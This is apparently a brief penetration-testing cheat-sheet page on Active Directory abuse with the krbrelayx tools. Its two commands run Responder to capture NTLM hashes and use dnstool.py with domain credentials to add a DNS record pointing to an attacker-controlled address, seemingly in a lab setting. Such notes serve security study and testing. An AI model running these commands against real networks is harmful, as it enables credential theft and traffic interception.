---
title: "Krbrelayx"
date: 2024-7-23
tags: ["Krbrelayx", "dnstools", "active driectory", "ad", "Windows", "dns"]
---

---
### Abuse #1: Add Active Directory Integrated DNS records via LDAP

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```bash
# Capture NTLM hash
sudo responder -I tun0
```

```bash
python3 dnstool.py -u <DOMAIN>\\<USER> -p <PASSWORD> --action add --record test --data 10.10.14.10 --type A 10.10.11.10
```

</div>

<small>*Ref: [krbrelayx tools](https://github.com/dirkjanm/krbrelayx)*</small>

{{< /tabcontent >}}

<br>